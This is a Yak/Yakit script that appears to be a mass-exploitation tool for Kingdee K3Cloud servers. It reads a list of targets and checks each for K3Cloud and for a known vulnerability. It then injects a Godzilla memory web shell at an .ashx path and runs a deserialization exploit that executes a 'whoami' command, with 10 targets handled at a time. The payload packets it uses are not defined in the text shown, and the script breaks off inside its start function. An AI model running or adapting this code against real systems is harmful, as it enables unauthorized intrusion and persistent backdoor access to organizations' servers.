buildUrl = func(host, port, path, isTls){
    url = ""
    if isTls{
        url = "https://"
    } else{
        url = "http://"
    }
    url += str.HostPort(host, port)
    if str.StartsWith(path,"/"){
        path = path[1:]
    } 
    url += "/" + path
    return url
}

checkExists = func(host, port, path, isTls, proxy){
    url = buildUrl(host, port, path, isTls)
    req, err := http.NewRequest("GET", url , 
        http.fakeua(),
        // http.noredirect(),
        http.proxy(proxy)
    )
    if err != nil{
        yakit.Error(f`Cannot build request ${url}, error: ${err}`)
        return false
    }
    rsp, err := http.Do(req)
    if err != nil{
        yakit.Error(f`Cannot access ${url}, error: ${err}`)
        return false
    }
    if rsp.StatusCode != 200 {
        yakit.Error(f`Not k3cloud(${url}), status code: ${rsp.StatusCode}`)
        return false
    }
    return true
}

checkVul := func(host, port, isTls, proxy){
    url = buildUrl(host, port, "/k3cloud", isTls)
    resp, req, err = poc.HTTP(PacketTest, poc.https(isTls), poc.params({"host": host, "port": port}),poc.redirectTimes(0))
    if err != nil {
        yakit.Error("poc.HTTP error: %v", err)
        return false
    }
    header, body = poc.Split(resp)
    rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
    if rspIns.StatusCode == 200 && str.Contains(string(rspIns.Body), `IsSuccess": true`){
        //yakit.Info(f`Vulnerable: ${url}`)
        //vulList = append(vulList, url)
        return true
    } else{
        println(f"response: ${string(rspIns.Body)}")
        //yakit.Info(f`Not vulnerable:${url}, response: ${rspIns.StatusCode}, ${rspIns.Body}`)
        return false
    }

}
injectMemshell := func(host, port, isTls, proxy){
    url = buildUrl(host, port, memshellPath, isTls)
    resp, req, err = poc.HTTP(PacketGodzilla, poc.https(isTls), poc.params({"host": host, "port": port}),poc.redirectTimes(0))
    if err != nil {
        yakit.Error("poc.HTTP error: %v", err)
        return false
    }
    header, body = poc.Split(resp)
    rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
    if rspIns.StatusCode == 200 && str.Contains(string(rspIns.Body), `IsSuccess": true`){
        //yakit.Info(f`Injectmemshell`)
        //memshellList = append(memshellList, url)
        return true
    } else{
        log.Info(f`Not vulnerable: ${url}, response: ${rspIns.StatusCode}, ${rspIns.Body}`)
        //yakit.Info(f`Not vulnerable:${url}, response: ${rspIns.StatusCode}, ${rspIns.Body}`)
        return false
    }
}

deserDetect = func(host, port, isTls, proxy, cmd){
      resp, req, err = poc.HTTP(PacketDeser, poc.https(isTls), poc.params({"host": host, "port": port, "cmd":cmd}),poc.redirectTimes(1))
    if err != nil {
        yakit.Error("poc.HTTP error: %v", err)
        return false
    }
    header, body = poc.Split(resp)
    rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
    l = re.FindSubmatchAll(string(rspIns.Body), "(?s)(.*?)rexsponse_error")
    if l == nil || len(l) < 2 {
        yakit.Error(f`Not vulnerable to deserilization: ${host}:${port}, response: ${rspIns.StatusCode}`)
        return false
    }
    res = string(l[1])
    res = str.ReplaceAll(res, "\n", "")
    yakit.Info(f`Vulnerable to deserilization: ${host}:${port}, result: ${res}`)
    return true
}

deserCheck = func(host, port, isTls, proxy){
    s = deserDetect(host,port,isTls,proxy, "whoami")
    return s
}

getHostPort = func(addr){
    isTls = false
    if str.StartsWith(addr, "https"){
        isTls = true
    }
    if !(str.StartsWith(addr, "http")){
        addr = "http://"+ addr
    }
    l = str.ParseStringToHosts(addr)
    if len(l) <= 0{
        yakit.Error(f"Error parse host: ${addr}")
        return nil,nil,nil
    }
    host,port = nil,nil
    try{
        host, port = str.ParseStringToHostPort(addr)~
    }catch err{
        host = l[0]
        if isTls{
            port = 443
        } else{
            port = 80
        }
    }
    return host, port, isTls
}

runPoc1 = func(addr){
    host, port, isTls = getHostPort(addr)
    proxy = ""
    url = buildUrl(host, port, K3Path, isTls)
    // f = checkExists(host, port , K3Path, isTls, proxy)
    // if !f{
    //     yakit.Error(`No k3cloud here, exit.`)
    //     return
    // }
    // yakit.Info(f`K3Cloud Exists: ${url}`)
    f = checkVul(host, port, isTls, proxy)
    if !f{
        yakit.Error(f`Not vulnerable: ${url}`)
        return
    }
    yakit.Info(f`Vulnerable: ${url}`)
    f = injectMemshell(host, port, isTls, proxy)
    if !f{
        yakit.Error(`Inject memshell failed`)
        return
    }
    u = buildUrl(host, port, "/k3Cloud/uploadfiles/config.ashx", isTls)
    yakit.Info(f`Inject godzilla memshell at ${u}`)
    return
}
runPoc2 = func(addr) {
    host, port, isTls = getHostPort(addr)
    proxy = ""
    f = deserCheck(host, port, isTls, proxy)
    if !f {
        return false
    }
}

handleUrl = func(swg, addr){
    swg.Add()
    go func{
        defer swg.Done()
        defer func{
            recover()
        }
        //yakit.Info("run")
        host, port, isTls = getHostPort(addr)
        proxy = ""
        url = buildUrl(host, port, K3Path, isTls)
        f = checkExists(host, port , K3Path, isTls, proxy)
        if !f{
            yakit.Error(`No k3cloud here, exit.`)
            return
        }
        yakit.Info(f`K3Cloud Exists: ${url}`)
        runPoc1(addr)
        runPoc2(addr)
    }
}

start = func(){
    addr = cli.String("target")
    addrs = cli.String("targets")
    cli.check()
    addrList = []
    if addr != ""{
        //yakit.Info(f`Target: ${addr}`)
        addrList = append(addrList, addr)
    }
    addrList.Extend(str.Split(addrs, "\n"))
    if len(addrList) <=0{
        yakit.Error("No target")
        return
    }
    targetList = []
    for i in addrList{
        ii = str.Trim(i, " ")
        if len(ii) > 0{
            targetList = append(targetList, ii)
        }
    }
    yakit.Info(f"Targets Number: ${len(targetList)}")
    swg = sync.NewSizedWaitGroup(10)
    for i in targetList{
        handleUrl(swg, i)
    }
    swg.Wait()

    //swg = sync.NewSizedWaitGroup(10)
